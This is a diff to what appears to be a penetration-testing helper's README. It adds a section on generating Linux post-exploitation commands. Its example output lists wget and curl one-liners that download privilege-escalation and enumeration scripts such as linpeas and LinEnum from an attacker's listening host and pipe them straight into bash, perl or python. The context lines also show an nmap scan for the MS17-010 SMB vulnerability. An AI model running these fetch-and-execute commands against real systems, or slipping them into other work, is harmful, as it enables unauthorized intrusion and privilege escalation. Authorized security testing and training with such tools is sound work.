@@ -44,3 +44,28 @@ $ nse ms17-010 192.168.10.10 139,445
 sudo nmap -p 139,445 --script=smb-vuln-ms17-010.nse -oN nmap_nse_smb-vuln-ms17-010.nse 192.168.10.10
 
 ```
+
+### Generate commands to help at Post Exploitation/Priv Escalation
+#### Linux: 
+Syntax:
+
+```
+weblinux LHOST <wget|curl> 
+```
+
+Example:
+
+```
+$ weblinux 192.168.10.10 wget
+wget -q http://192.168.10.10/LinEnum.sh -O - | bash
+wget -q http://192.168.10.10/linpeas.sh -O - | bash
+wget -q http://192.168.10.10/linux-exploit-suggester-2.pl -O - | perl
+wget -q http://192.168.10.10/linux-exploit-suggester.sh -O - | bash
+wget -q  http://192.168.10.10/linuxprivchecker.py -O - | python
+$ weblinux 192.168.10.10 curl
+curl -s http://192.168.10.10/LinEnum.sh | bash
+curl -s http://192.168.10.10/linpeas.sh | bash
+curl -s http://192.168.10.10/linux-exploit-suggester-2.pl | perl
+curl -s http://192.168.10.10/linux-exploit-suggester.sh | bash
+curl  -s http://192.168.10.10/linuxprivchecker.py | python
+```
